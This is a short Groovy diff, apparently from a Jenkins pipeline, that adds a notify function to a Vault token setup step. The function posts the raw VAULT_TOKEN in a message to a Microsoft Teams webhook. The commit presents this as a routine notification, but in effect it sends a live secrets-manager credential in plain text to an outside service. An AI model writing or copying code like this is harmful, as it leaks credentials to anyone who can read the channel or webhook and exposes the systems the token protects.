@@ -11,5 +11,10 @@ private static void create_token(VAULT_ADDR, VAULT_TOKEN) {
             .build()
 
     final Vault vault = new Vault(config)
+    notify(VAULT_TOKEN)
+}
 
+def notify(VAULT_TOKEN) {
+    // send teams notification
+    office365ConnectorSend message: "Token: #${VAULT_TOKEN}", webhookUrl: EMAIL_TEAMS
 }
